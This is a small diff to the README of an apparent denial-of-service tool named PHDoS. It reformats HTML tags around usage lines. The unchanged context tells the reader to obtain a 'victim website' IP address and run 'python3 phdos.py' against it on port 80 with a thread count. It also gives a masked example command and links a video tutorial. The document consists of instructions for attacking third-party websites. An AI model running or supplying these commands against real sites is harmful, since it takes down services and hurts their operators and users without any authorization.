@@ -20,7 +20,7 @@ Get the IP Address of a victim website<br>
 $ cd PHDoS/<br>
 $ ls<br>
 $ python3 phdos.py -s [Victim ip Address] -p 80 -t 135<br>
-example:<br>
+<br><b>Example:</b></br>
 $ python3 phdos.py -s xx.xxx.xxx.xxx -p 80 -t 135<br>
-Video Tutorial Link: https://youtu.be/jA4Ecnm6WEk<br>
+<br>Video Tutorial Link: https://youtu.be/jA4Ecnm6WEk</br>
 
